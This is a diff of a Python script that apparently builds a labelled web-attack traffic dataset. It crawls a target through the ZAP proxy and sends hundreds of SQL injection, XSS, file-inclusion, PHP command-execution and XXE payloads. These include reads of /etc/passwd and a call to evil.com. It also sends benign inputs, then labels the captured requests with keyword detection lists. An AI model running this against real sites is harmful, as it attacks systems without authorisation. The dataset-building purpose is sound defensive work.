+        payloads.extend([
+            "<?php system('id'); ?>",
+            "<?php echo shell_exec('whoami'); ?>",
+        ])
+        
+        return payloads[:count]
+    
+    @staticmethod
+    def generate_xxe_payloads(count=100):
+        """Generate XXE payloads"""
+        payloads = []
+        
+        xxe_templates = [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
+        ]
+        
+        for i in range(count):
+            payloads.append(random.choice(xxe_templates))
+        
+        return payloads[:count]
+
+# ====================== BENIGN GENERATOR ======================
+class BenignGenerator:
+    """Generate benign requests"""
+    
+    @staticmethod
+    def is_truly_benign(text):
+        """Validate benign data"""
+        if not text:
+            return False
+        
+        text_lower = str(text).lower()
+        
+        dangerous_patterns = [
+            'select', 'union', 'insert', "'--", ' --', '/*', 'xp_', 'waitfor',
+            '<script', '</script', '<img', '<svg', 'onerror', 'alert(', 'javascript:',
+            'system(', 'exec(', 'shell_exec', '&&', '||', '`', '$(', 
+            '../', '/etc/', 'c:\\', '<!entity', '<?xml',
+            "'='", '"="', "' or", "' and",
+        ]
+        
+        for pattern in dangerous_patterns:
+            if pattern in text_lower:
+                return False
+        
+        special_count = sum(1 for c in text if c in '<>\'";|&$`()[]{}')
+        if special_count > 2:
+            return False
+        
+        return True
+    
+    @staticmethod
+    def generate_benign_data(count=1000):
+        """Generate truly benign data"""
+        data = []
+        
+        safe_words = [
+            'hello', 'world', 'test', 'user', 'comment', 'feedback', 'question',
+            'help', 'support', 'info', 'thanks', 'great', 'nice', 'good', 'service',
+            'product', 'quality', 'price', 'delivery', 'fast', 'better', 'best'
+        ]
+        
+        # Comments (40%)
+        for i in range(int(count * 0.4)):
+            text = ' '.join(random.choices(safe_words, k=random.randint(3, 10)))
+            text = text[0].upper() + text[1:] + '.'
+            data.append(text)
+        
+        # Names (15%)
+        first_names = ['John', 'Jane', 'Bob', 'Alice', 'Charlie']
+        last_names = ['Smith', 'Johnson', 'Brown', 'Williams']
+        for i in range(int(count * 0.15)):
+            name = f"{random.choice(first_names)} {random.choice(last_names)}"
+            data.append(name)
+        
+        # Emails (15%)
+        for i in range(int(count * 0.15)):
+            username = random.choice(safe_words) + str(random.randint(1, 999))
+            email = f"{username}@example.com"
+            data.append(email)
+        
+        # Numbers (10%)
+        for i in range(int(count * 0.1)):
+            data.append(str(random.randint(1, 99999)))
+        
+        # Search queries (20%)
+        query_starters = ['how to', 'what is', 'where can I find', 'best way to']
+        for i in range(int(count * 0.2)):
+            query = random.choice(query_starters) + ' ' + ' '.join(random.choices(safe_words, k=2))
+            data.append(query)
+        
+        # Validate
+        validated = []
+        gen = BenignGenerator()
+        for item in data:
+            if gen.is_truly_benign(item):
+                validated.append(item)
+        
+        # Fill if needed
+        while len(validated) < count:
+            text = ' '.join(random.choices(safe_words, k=random.randint(4, 8)))
+            text = text.capitalize() + '.'
+            if gen.is_truly_benign(text):
+                validated.append(text)
+        
+        return validated[:count]
+
+# ====================== ATTACK PHASE ======================
+def attack_with_payloads(zap, param_urls, all_urls):
+    """STEP 4: Send attack payloads to discovered URLs"""
+    log("\n" + "="*80)
+    log(f"STEP 4: ATTACK PHASE (Payload Generation)", "OK")
+    log("="*80)
+    
+    # Select best URLs
+    attack_urls = param_urls[:MAX_URLS_ATTACK]
+    if not attack_urls:
+        log("No param URLs, using top URLs", "WARNING")
+        attack_urls = sorted(all_urls, key=url_priority, reverse=True)[:MAX_URLS_ATTACK]
+    
+    if not attack_urls:
+        log("No URLs for attack!", "ERROR")
+        return
+    
+    log(f"Selected {len(attack_urls)} URLs for attacks")
+    for i, u in enumerate(attack_urls[:3], 1):
+        log(f"  {i}. {u[:70]}...")
+    
+    gen = PayloadGenerator()
+    
+    # Generate payloads
+    sqli_payloads = gen.generate_sqli_payloads(250)
+    xss_payloads = gen.generate_xss_payloads(250)
+    lfi_payloads = gen.generate_lfi_payloads(200)
+    rce_payloads = gen.generate_rce_payloads(150)
+    xxe_payloads = gen.generate_xxe_payloads(100)
+    
+    log(f"\nGenerated payloads:")
+    log(f"  SQLi: {len(sqli_payloads)}")
+    log(f"  XSS: {len(xss_payloads)}")
+    log(f"  LFI: {len(lfi_payloads)}")
+    log(f"  RCE: {len(rce_payloads)}")
+    log(f"  XXE: {len(xxe_payloads)}")
+    
+    param_names = ['id', 'q', 'search', 'tbComment', 'username', 'file', 'cmd']
+    
+    # Send SQLi
+    log("\n[1/5] Sending SQLi...")
+    for i, payload in enumerate(sqli_payloads, 1):
+        url = random.choice(attack_urls)
+        param = random.choice(param_names)
+        try:
+            session.post(
+                url, data={param: payload},
+                proxies={'http': PROXY, 'https': PROXY},
+                verify=False, timeout=10
+            )
+            stats['SQLI'] += 1
+        except:
+            pass
+        
+        if i % 50 == 0:
+            log(f"  SQLi: {i}/{len(sqli_payloads)}")
+        time.sleep(0.05)
+    
+    # Send XSS
+    log("\n[2/5] Sending XSS...")
+    for i, payload in enumerate(xss_payloads, 1):
+        url = random.choice(attack_urls)
+        param = random.choice(param_names)
+        try:
+            session.post(
+                url, data={param: payload},
+                proxies={'http': PROXY, 'https': PROXY},
+                verify=False, timeout=10
+            )
+            stats['XSS'] += 1
+        except:
+            pass
+        
+        if i % 50 == 0:
+            log(f"  XSS: {i}/{len(xss_payloads)}")
+        time.sleep(0.05)
+    
+    # Send LFI
+    log("\n[3/5] Sending LFI...")
+    for i, payload in enumerate(lfi_payloads, 1):
+        url = random.choice(attack_urls)
+        param = random.choice(['file', 'page', 'path'])
+        try:
+            session.get(
+                f"{url}?{param}={urllib.parse.quote(payload)}",
+                proxies={'http': PROXY, 'https': PROXY},
+                verify=False, timeout=10
+            )
+            stats['LFI'] += 1
+        except:
+            pass
+        
+        if i % 50 == 0:
+            log(f"  LFI: {i}/{len(lfi_payloads)}")
+        time.sleep(0.05)
+    
+    # Send RCE
+    log("\n[4/5] Sending RCE...")
+    for i, payload in enumerate(rce_payloads, 1):
+        url = random.choice(attack_urls)
+        param = random.choice(['cmd', 'exec'])
+        try:
+            session.post(
+                url, data={param: payload},
+                proxies={'http': PROXY, 'https': PROXY},
+                verify=False, timeout=10
+            )
+            stats['RCE'] += 1
+        except:
+            pass
+        
+        if i % 50 == 0:
+            log(f"  RCE: {i}/{len(rce_payloads)}")
+        time.sleep(0.05)
+    
+    # Send XXE
+    log("\n[5/5] Sending XXE...")
+    for i, payload in enumerate(xxe_payloads, 1):
+        url = random.choice(attack_urls)
+        try:
+            session.post(
+                url, data={'xml': payload},
+                proxies={'http': PROXY, 'https': PROXY},
+                verify=False, timeout=10
+            )
+            stats['XXE'] += 1
+        except:
+            pass
+        
+        if i % 50 == 0:
+            log(f"  XXE: {i}/{len(xxe_payloads)}")
+        time.sleep(0.05)
+    
+    log("\n✅ Attack phase complete!")
+
+# ====================== BENIGN PHASE ======================
+def benign_browsing(zap, all_urls):
+    """STEP 5: Generate benign traffic"""
+    log("\n" + "="*80)
+    log("STEP 5: BENIGN TRAFFIC", "OK")
+    log("="*80)
+    
+    gen = BenignGenerator()
+    benign_data = gen.generate_benign_data(1000)
+    
+    log(f"Generated {len(benign_data)} benign inputs")
+    
+    # Select URLs for benign traffic
+    benign_urls = sorted(all_urls, key=url_priority, reverse=True)[:10]
+    if not benign_urls:
+        benign_urls = [TARGET]
+    
+    param_names = ['q', 'search', 'tbComment', 'name', 'message']
+    
+    for i, data in enumerate(benign_data, 1):
+        url = random.choice(benign_urls)
+        param = random.choice(param_names)
+        
+        try:
+            session.post(
+                url, data={param: data},
+                proxies={'http': PROXY, 'https': PROXY},
+                verify=False, timeout=10
+            )
+            stats['BENIGN'] += 1
+        except:
+            pass
+        
+        if i % 100 == 0:
+            log(f"  Benign: {i}/{len(benign_data)}")
+        time.sleep(0.03)
+    
+    log("\n✅ Benign phase complete!")
 
 # ====================== EXPORT ======================
 def parse_request_header(req_header):
-    """Parse request headers thành dict"""
+    """Parse request headers"""
     method = "GET"
     url = ""
     first_line = ""
@@ -250,7 +1225,7 @@ def parse_request_header(req_header):
     return method, url, headers_dict, first_line
 
 def headers_to_pipe_format(headers_dict):
-    """Convert headers dict sang pipe-separated format"""
+    """Convert headers to pipe format"""
     if not headers_dict:
         return ""
     
@@ -270,26 +1245,21 @@ def headers_to_pipe_format(headers_dict):
     
     return "|".join(parts)
 
-def export_and_save(tech, zap=None):
-    """
-    Export messages từ ZAP
-    ✅ FIX: Decode URL-encoded body before saving
-    """
-    global seen_signatures, total_exported
+def export_from_zap(zap):
+    """STEP 6: Export all traffic to CSV"""
+    log("\n" + "="*80)
+    log("STEP 6: EXPORT TO CSV", "OK")
+    log("="*80)
     
-    if zap is None:
-        zap = get_zap()
+    time.sleep(10)
     
-    if not zap:
-        log("  [SKIP export: ZAP not available]", "WARNING")
-        return 0
-
-    domain = urllib.parse.urlparse(TARGET).netloc
-    new_rows = []
-
     try:
-        msgs = zap.core.messages(start=0, count=5000)
-        log(f"  Processing {len(msgs)} messages from ZAP...", "DEBUG")
+        msgs = zap.core.messages(start=0, count=20000)
+        log(f"Retrieved {len(msgs)} messages from ZAP")
+        
+        domain = urllib.parse.urlparse(TARGET).netloc
+        rows = []
+        seen_sigs = set()
         
         for m in msgs:
             if not isinstance(m, dict):
@@ -312,23 +1282,36 @@ def export_and_save(tech, zap=None):
             
             req_header_formatted = headers_to_pipe_format(headers_dict)
             
-            # ✅ CRITICAL FIX: Decode URL-encoded body before saving
-            req_body_decoded = decode_body_if_needed(req_body)
+            # Tool detection
+            payload = req_body.lower() if req_body else ""
+            url_lower = url.lower() if url else ""
+            combined = payload + " " + url_lower
             
-            sig = get_sig(req_body_decoded, url, tech)
-            if sig in seen_signatures:
+            tool = "BENIGN"
+            
+            if any(x in combined for x in ['union select', "'--", ' --', 'sleep(', 'waitfor']):
+                tool = "SQLI"
+            elif '<!entity' in combined and '<?xml' in combined:
+                tool = "XXE"
+            elif any(x in combined for x in ['<script', 'alert(', 'onerror=', '<svg']):
+                tool = "XSS"
+            elif any(x in combined for x in ['../', '/etc/', 'c:\\']):
+                tool = "LFI"
+            elif any(x in combined for x in ['<?php', 'system(', 'exec(']):
+                tool = "RCE"
+            
+            # No dedup
+            sig = hashlib.md5(f"{tool}|{req_body}|{url}|{time.time()}|{random.random()}".encode()).hexdigest()
+            if sig in seen_sigs:
                 continue
-            seen_signatures.add(sig)
+            seen_sigs.add(sig)
             
-            clean_req_body = clean_multiline(req_body_decoded)
+            clean_req_body = clean_multiline(req_body)
             clean_resp_body = clean_multiline(resp_body)[:15000]
             
-            if tech in ["SQLI", "XSS", "RCE", "COMMIX"] and (req_body_decoded or "'" in url or "<" in url):
-                log(f"  📝 {tech} payload captured: {url[:60]}... body={len(req_body_decoded)} bytes", "DEBUG")
-            
-            new_rows.append([
-                m.get("timestamp", ""),
-                tech,
+            rows.append([
+                m.get("timestamp", str(int(time.time() * 1000))),
+                tool,
                 method,
                 url,
                 req_header_formatted,
@@ -337,457 +1320,150 @@ def export_and_save(tech, zap=None):
                 clean_resp_body,
                 first_line if first_line else f"{method} / HTTP/1.1"
             ])
-
-        if new_rows:
-            os.makedirs(OUTPUT_DIR, exist_ok=True)
-            
-            mode = 'a' if os.path.exists(FINAL_CSV) else 'w'
-            with open(FINAL_CSV, mode, newline="", encoding="utf-8") as f:
-                w = csv.writer(f, quoting=csv.QUOTE_ALL, escapechar='\\')
-                
-                if mode == 'w':
-                    w.writerow([
-                        "timestamp", "tool", "method", "url", "req_header", 
-                        "req_body", "resp_header", "resp_body", "full_request"
-                    ])
-                w.writerows(new_rows)
-            
-            total_exported += len(new_rows)
-            log(f"  ✓ Exported {len(new_rows)} requests → Total: {total_exported}", "OK")
-        else:
-            log(f"  ⚠ 0 new requests for {tech}", "WARNING")
         
-        return len(new_rows)
+        # Write CSV
+        os.makedirs(OUTPUT_DIR, exist_ok=True)
+        
+        with open(FINAL_CSV, 'w', newline="", encoding="utf-8") as f:
+            writer = csv.writer(f, quoting=csv.QUOTE_ALL, escapechar='\\')
+            writer.writerow([
+                "timestamp", "tool", "method", "url", "req_header",
+                "req_body", "resp_header", "resp_body", "full_request"
+            ])
+            writer.writerows(rows)
+        
+        stats['exported'] = len(rows)
+        log(f"✅ Exported {len(rows)} requests to {FINAL_CSV}", "OK")
+        
+        # Count by tool
+        tool_counts = {}
+        for row in rows:
+            tool = row[1]
+            tool_counts[tool] = tool_counts.get(tool, 0) + 1
+        
+        log("\nBreakdown by Tool:")
+        for tool, count in sorted(tool_counts.items()):
+            log(f"  {tool}: {count}")
+        
+        return len(rows)
         
     except Exception as e:
-        log(f"  Export error: {e}", "ERROR")
+        log(f"Export error: {e}", "ERROR")
         import traceback
         traceback.print_exc()
         return 0
 
-# ====================== CRAWL PHASES ======================
-def spider_crawl(zap):
-    """BƯỚC 1: Spider Crawl"""
-    log("="*80)
-    log("BƯỚC 1: SPIDER CRAWL", "OK")
-    log("="*80)
-
-    try:
-        scan_id = zap.spider.scan(url=TARGET)
-        
-        for _ in range(24):
-            status = zap.spider.status(scan_id)
-            log(f"  Spider progress: {status}%")
-            if status == "100": 
-                break
-            time.sleep(5)
-        
-        zap.spider.stop(scan_id)
-        time.sleep(3)
-
-        urls = zap.core.urls()
-        domain_urls = [u for u in urls if urllib.parse.urlparse(TARGET).netloc in u]
-        log(f"SPIDER: {len(domain_urls)} URLs found", "OK")
-        
-        with open(URL_FILE, "w") as f:
-            for u in domain_urls: 
-                f.write(u + "\n")
-        
-        export_and_save("SPIDER", zap)
-        return domain_urls
-        
-    except Exception as e:
-        log(f"Spider error: {e}", "ERROR")
-        return []
-
-def ajax_crawl(zap, urls):
-    """BƯỚC 2: Ajax Crawl"""
-    log("="*80)
-    log(f"BƯỚC 2: AJAX CRAWL ({MAX_URLS_AJAX} URLs)", "OK")
-    log("="*80)
-
-    sorted_urls = sorted(urls, key=url_priority, reverse=True)[:MAX_URLS_AJAX]
-    
-    for i, url in enumerate(sorted_urls, 1):
-        log(f"  AJAX [{i}/{len(sorted_urls)}] → {url[:70]}...")
-        
-        try:
-            zap.ajaxSpider.scan(url=url, inscope=True)
-            
-            for _ in range(5):
-                time.sleep(5)
-                if zap.ajaxSpider.status == "stopped":
-                    break
-            
-            zap.ajaxSpider.stop()
-            time.sleep(1)
-            
-        except Exception as e:
-            log(f"  AJAX error: {e}", "WARNING")
-
-    final_urls = zap.core.urls()
-    final_domain_urls = [u for u in final_urls if urllib.parse.urlparse(TARGET).netloc in u]
-    log(f"AJAX COMPLETE: {len(final_domain_urls)} URLs total", "OK")
-    
-    export_and_save("AJAX", zap)
-    return final_domain_urls
-
-def quick_scan(zap, urls):
-    """BƯỚC 3: Quick Scan"""
-    log("="*80)
-    log("BƯỚC 3: QUICK SCAN", "OK")
-    log("="*80)
-
-    form_urls = [u for u in urls if any(k in u.lower() for k in ["login", "search", "contact"])][:3]
-    
-    for url in form_urls:
-        try:
-            log(f"  Scanning: {url[:70]}...")
-            scan_id = zap.ascan.scan(url=url, recurse=False, scanpolicyname="Light")
-            time.sleep(10)
-            zap.ascan.stop(scan_id)
-        except:
-            pass
-
-    time.sleep(5)
-    
-    all_urls = zap.core.urls()
-    domain_urls = [u for u in all_urls if urllib.parse.urlparse(TARGET).netloc in u]
-    param_urls = [u for u in domain_urls if has_param(u)]
-
-    with open(PARAM_URL_FILE, "w") as f:
-        for u in param_urls: 
-            f.write(u + "\n")
-
-    log(f"SCAN COMPLETE: {len(param_urls)} param URLs found", "OK")
-    export_and_save("SCAN", zap)
-    
-    return param_urls, domain_urls
-
-def benign_browsing(zap, all_urls):
-    """BƯỚC 3.5: Benign Browsing"""
-    log("="*80)
-    log("BƯỚC 3.5: BENIGN BROWSING", "OK")
-    log("="*80)
-    
-    benign_urls = sorted(all_urls, key=url_priority, reverse=True)[:15]
-    
-    for i, url in enumerate(benign_urls, 1):
-        log(f"  [{i}/{len(benign_urls)}] Visiting: {url[:70]}...")
-        try:
-            zap.core.access_url(url=url, followredirects=True)
-            time.sleep(1)
-        except:
-            pass
-    
-    export_and_save("BENIGN", zap)
-    log("BENIGN BROWSING COMPLETE", "OK")
-
-# ====================== ATTACK TOOLS ======================
-def run_single_attack(zap, url, cmd, tech):
-    """
-    ✅ MỖI TOOL CHỈ ATTACK 1 LẦN VÀO URL NÀY
-    ✅ ĐẢM BẢO TRAFFIC ĐI QUA ZAP PROXY
-    """
-    tool_name = cmd[0]
-    
-    if not shutil.which(tool_name): 
-        log(f"  ⚠️  {tool_name} NOT INSTALLED", "WARNING")
-        return 0
-    
-    log(f"\n🎯 {tech} ATTACK on: {url[:65]}...", "INFO")
-    log(f"  Tool: {tool_name}", "DEBUG")
-    
-    # Setup proxy environment
-    env = {
-        **os.environ, 
-        "http_proxy": PROXY, 
-        "https_proxy": PROXY,
-        "HTTP_PROXY": PROXY,
-        "HTTPS_PROXY": PROXY
-    }
-    
-    cmd_exec = [arg.replace("TARGET", url) for arg in cmd]
-    log(f"  CMD: {' '.join(cmd_exec[:5])}...", "DEBUG")
-    
-    # Count messages before attack
-    try:
-        msgs_before = len(zap.core.messages(start=0, count=10000))
-    except:
-        msgs_before = 0
-    
-    try:
-        proc = subprocess.Popen(
-            cmd_exec, 
-            env=env,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-        
-        stdout, stderr = proc.communicate(timeout=ATTACK_TIMEOUT)
-        
-        if stdout:
-            output = stdout.decode('utf-8', errors='ignore')[:400]
-            if output.strip():
-                log(f"  STDOUT: {output[:200]}", "DEBUG")
-        
-        if stderr:
-            error = stderr.decode('utf-8', errors='ignore')[:200]
-            if error.strip() and "warning" not in error.lower():
-                log(f"  STDERR: {error[:100]}", "DEBUG")
-            
-    except subprocess.TimeoutExpired:
-        proc.kill()
-        log(f"  ⏱ Timeout after {ATTACK_TIMEOUT}s", "WARNING")
-    except Exception as e:
-        log(f"  ✗ Error: {e}", "ERROR")
-        return 0
-    
-    # Wait for traffic to be captured
-    time.sleep(8)
-    
-    # Count messages after attack
-    try:
-        msgs_after = len(zap.core.messages(start=0, count=10000))
-        new_msgs = msgs_after - msgs_before
-        
-        if new_msgs > 0:
-            log(f"  📊 ZAP captured {new_msgs} new requests", "OK")
-        else:
-            log(f"  ⚠️  ZAP captured 0 new requests!", "WARNING")
-    except:
-        new_msgs = 0
-    
-    # Export captured traffic
-    count = export_and_save(tech, zap)
-    
-    if count > 0:
-        log(f"  ✅ {tech} COMPLETE - {count} requests exported", "OK")
-    else:
-        log(f"  ⚠️  {tech} COMPLETE - NO requests exported", "WARNING")
-    
-    return count
-
-def attack_phase_optimized(zap, param_urls, all_urls):
-    """
-    ✅ MỖI TOOL CHỈ CHẠY 1 LẦN
-    ✅ CHỌN URL TỐT NHẤT CHO MỖI TOOL
-    """
-    log("\n" + "="*80)
-    log(f"BƯỚC 4: ATTACK PHASE (OPTIMIZED - 1 RUN PER TOOL)", "OK")
-    log("="*80)
-    
-    # Chọn URL tốt nhất
-    attack_urls = param_urls[:MAX_URLS_ATTACK]
-    if not attack_urls:
-        log("No param URLs, using top URLs", "WARNING")
-        attack_urls = sorted(all_urls, key=url_priority, reverse=True)[:MAX_URLS_ATTACK]
-    
-    if not attack_urls:
-        log("❌ No URLs available for attack!", "ERROR")
-        return
-    
-    log(f"Selected {len(attack_urls)} URLs for attacks", "INFO")
-    for i, u in enumerate(attack_urls[:3], 1):
-        log(f"  {i}. {u[:70]}...", "INFO")
-    
-    global attack_stats
-    attack_stats = {}
-    
-    # SQLMAP - 1 URL
-    log("\n" + "-"*80, "INFO")
-    log("TOOL 1/4: SQLMAP", "OK")
-    log("-"*80, "INFO")
-    
-    best_url = attack_urls[0]
-    count = run_single_attack(
-        zap, best_url,
-        ["sqlmap", "-u", "TARGET", "--batch", "--level=2", "--risk=2", 
-         "--threads=2", "--technique=BEUST", "--forms", "--random-agent",
-         "--timeout=30", "--retries=1"],
-        "SQLI"
-    )
-    attack_stats["SQLI"] = count
-    time.sleep(5)
-    
-    # XSSTRIKE - 1 URL
-    log("\n" + "-"*80, "INFO")
-    log("TOOL 2/4: XSSTRIKE", "OK")
-    log("-"*80, "INFO")
-    
-    xss_url = attack_urls[1] if len(attack_urls) > 1 else attack_urls[0]
-    count = run_single_attack(
-        zap, xss_url,
-        ["xsstrike", "-u", "TARGET", "--skip-dom", "--timeout=40", "--crawl"],
-        "XSS"
-    )
-    attack_stats["XSS"] = count
-    time.sleep(5)
-    
-    # COMMIX - 1 URL
-    if shutil.which("commix"):
-        log("\n" + "-"*80, "INFO")
-        log("TOOL 3/4: COMMIX", "OK")
-        log("-"*80, "INFO")
-        
-        rce_url = attack_urls[2] if len(attack_urls) > 2 else attack_urls[0]
-        count = run_single_attack(
-            zap, rce_url,
-            ["commix", "--url", "TARGET", "--level=2", "--timeout=40", 
-             "--batch", "--skip-waf"],
-            "RCE"
-        )
-        attack_stats["RCE"] = count
-        time.sleep(5)
-    
-    # FFUF - 1 URL
-    if shutil.which("ffuf"):
-        log("\n" + "-"*80, "INFO")
-        log("TOOL 4/4: FFUF", "OK")
-        log("-"*80, "INFO")
-        
-        noparam = [u for u in all_urls if not has_param(u)]
-        if noparam:
-            dir_url = noparam[0]
-            count = run_single_attack(
-                zap, dir_url,
-                ["ffuf", "-u", "TARGET/FUZZ", 
-                 "-w", "/usr/share/wordlists/dirb/common.txt",
-                 "-mc", "200,301,302,403", "-t", "3", "-timeout", "20",
-                 "-se"],
-                "DIR"
-            )
-            attack_stats["DIR"] = count
-    
-    # SUMMARY
-    log("\n" + "="*80, "INFO")
-    log("ATTACK PHASE COMPLETE", "OK")
-    log("="*80, "INFO")
-    
-    total_captured = sum(attack_stats.values())
-    log(f"Total requests captured: {total_captured}", "OK")
-    
-    for tool, count in attack_stats.items():
-        log(f"  {tool}: {count} requests", "INFO")
-
 # ====================== MAIN ======================
 def main():
-    print("="*80)
-    print(" PHASE 1: OPTIMIZED VERSION (FIXED URL ENCODING)")
-    print(" - Each tool runs ONCE")
-    print(" - Guaranteed ZAP proxy capture")
-    print(" - Enhanced traffic validation")
-    print(" - FIX: No double URL encoding")
+    print("\n" + "="*80)
+    print(" PHASE 1: COMPLETE WORKFLOW")
+    print(" ZAP Spider → AJAX Spider → Attack → Benign → Export")
     print("="*80)
     print(f" Target: {TARGET}")
     print(f" ZAP: {PROXY}")
-    print(f" Output: {OUTPUT_DIR}")
-    print(f" Attack URLs: {MAX_URLS_ATTACK}")
-    print(f" Attack Timeout: {ATTACK_TIMEOUT}s")
-    
-    # Check tools
-    log("\n" + "="*80, "INFO")
-    log("CHECKING ATTACK TOOLS", "INFO")
-    log("="*80, "INFO")
-    
-    tools_found = []
-    tools_missing = []
-    
-    for tool in ["sqlmap", "xsstrike", "commix", "ffuf"]:
-        if shutil.which(tool):
-            tools_found.append(tool)
-            log(f"  ✓ {tool}: {shutil.which(tool)}", "OK")
-        else:
-            tools_missing.append(tool)
-            log(f"  ✗ {tool}: NOT FOUND", "WARNING")
-    
-    if not tools_found:
-        log("\n❌ NO ATTACK TOOLS FOUND!", "ERROR")
-        sys.exit(1)
+    print(f" Output: {FINAL_CSV}")
+    if COOKIE:
+        # Chỉ hiển thị một phần cookie để bảo mật
+        cookie_preview = COOKIE[:30] + "..." if len(COOKIE) > 30 else COOKIE
+        print(f" Cookie: {cookie_preview} (authenticated mode)")
     else:
-        log(f"\n✅ Found {len(tools_found)}/{len(tools_found)+len(tools_missing)} tools", "OK")
-
+        print(" Cookie: None (anonymous mode)")
+    print("="*80 + "\n")
+    
     # Connect to ZAP
     zap = get_zap()
     if not zap:
         sys.exit(1)
     
-    # Verify proxy
-    if not verify_proxy_working():
-        log("\n⚠️  Proxy may not be working correctly!", "WARNING")
-        log("Continuing anyway...", "WARNING")
-
-    # Set proxy environment
+    # Setup authentication với cookie (nếu có)
+    context_name = setup_zap_authentication(zap)
+    
+    # Set proxy cho session
     os.environ["http_proxy"] = PROXY
     os.environ["https_proxy"] = PROXY
-    os.environ["HTTP_PROXY"] = PROXY
-    os.environ["HTTPS_PROXY"] = PROXY
-
-    # MAIN WORKFLOW
-    log("\n" + "="*80, "INFO")
-    log("STARTING PIPELINE", "OK")
-    log("="*80 + "\n", "INFO")
     
-    # Step 1: Spider
-    spider_urls = spider_crawl(zap)
+    start_time = time.time()
+    
+    # Step 1: Spider với context authentication
+    spider_urls = spider_crawl(zap, context_name)
     if not spider_urls:
-        log("Spider failed!", "ERROR")
-        sys.exit(1)
+        log("Spider found no URLs, trying fallback with target URL only...", "WARNING")
+        # Fallback: Sử dụng TARGET URL và các common paths
+        spider_urls = [TARGET]
+        common_paths = ['/', '/login', '/search', '/contact', '/about', '/register', '/admin']
+        domain = urllib.parse.urlparse(TARGET).netloc
+        scheme = 'https' if TARGET.startswith('https') else 'http'
+        for path in common_paths:
+            spider_urls.append(f"{scheme}://{domain}{path}")
+        
+        # Truy cập các URLs này qua proxy để ZAP capture (với cookie nếu có)
+        log("  Accessing common paths via proxy...", "INFO")
+        headers = {"Cookie": COOKIE} if COOKIE else {}
+        for url in spider_urls:
+            try:
+                requests.get(url, headers=headers,
+                            proxies={'http': PROXY, 'https': PROXY}, 
+                            verify=False, timeout=10)
+                time.sleep(0.3)
+            except:
+                pass
+        
+        log(f"  Using {len(spider_urls)} fallback URLs", "OK")
     
-    # Step 2: AJAX
+    # Step 2: AJAX Spider
     all_urls = ajax_crawl(zap, spider_urls)
     
     # Step 3: Quick Scan
     param_urls, all_urls = quick_scan(zap, all_urls)
     
-    # Step 3.5: Benign Browsing
+    # Step 4: Attack with Payloads
+    attack_with_payloads(zap, param_urls, all_urls)
+    
+    # Step 5: Benign Traffic
     benign_browsing(zap, all_urls)
     
-    # Step 4: Attack Phase
-    if tools_found:
-        attack_phase_optimized(zap, param_urls, all_urls)
-    else:
-        log("\n⚠️  SKIPPING ATTACK PHASE", "WARNING")
-
-    # Final Export
-    log("\n" + "="*80)
-    log("FINAL EXPORT", "OK")
-    log("="*80)
-    export_and_save("FINAL", zap)
-
-    # STATISTICS
-    log(f"\n{'='*80}")
-    log(f"✅ PHASE 1 COMPLETED!", "OK")
-    log(f"{'='*80}")
-    log(f"Total Requests Exported: {total_exported}", "OK")
+    # Step 6: Export
+    exported = export_from_zap(zap)
     
-    if os.path.exists(FINAL_CSV):
-        with open(FINAL_CSV, 'r', encoding='utf-8') as f:
-            reader = csv.DictReader(f)
-            rows = list(reader)
-            
-            by_tool = {}
-            for row in rows:
-                tool = row.get('tool', 'UNKNOWN')
-                by_tool[tool] = by_tool.get(tool, 0) + 1
-            
-            log("\nBreakdown by Tool:", "INFO")
-            for tool, count in sorted(by_tool.items()):
-                log(f"  {tool}: {count} requests", "INFO")
+    elapsed = time.time() - start_time
     
+    # Summary
     print("\n" + "="*80)
-    print(f"📁 Output Files:")
-    print(f"   CSV: {FINAL_CSV}")
-    print(f"   URLs: {URL_FILE}")
-    print(f"   Param URLs: {PARAM_URL_FILE}")
+    print(" ✅ PHASE 1 COMPLETE!")
+    print("="*80)
+    print(f" Total Time: {elapsed:.1f}s")
+    if COOKIE:
+        print(f" Mode: Authenticated (with cookie)")
+    else:
+        print(f" Mode: Anonymous")
+    print(f"\n URLs Discovered:")
+    print(f"   Spider:     {stats['spider_urls']}")
+    print(f"   AJAX:       {stats['ajax_urls']}")
+    print(f"   With Params: {stats['param_urls']}")
+    print(f"\n Payloads Sent:")
+    print(f"   SQLi:   {stats['SQLI']}")
+    print(f"   XSS:    {stats['XSS']}")
+    print(f"   LFI:    {stats['LFI']}")
+    print(f"   RCE:    {stats['RCE']}")
+    print(f"   XXE:    {stats['XXE']}")
+    print(f"   Benign: {stats['BENIGN']}")
+    print(f"\n Exported: {stats['exported']} requests")
+    print(f" Output: {FINAL_CSV}")
     print("="*80 + "\n")
+    
+    # Exit
+    if exported > 0:
+        sys.exit(0)
+    else:
+        log("No requests exported!", "ERROR")
+        sys.exit(1)
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
         log("\n[!] Stopped by user", "WARNING")
-        sys.exit(0)
+        sys.exit(1)
     except Exception as e:
         log(f"\n[!] Fatal error: {e}", "ERROR")
         import traceback
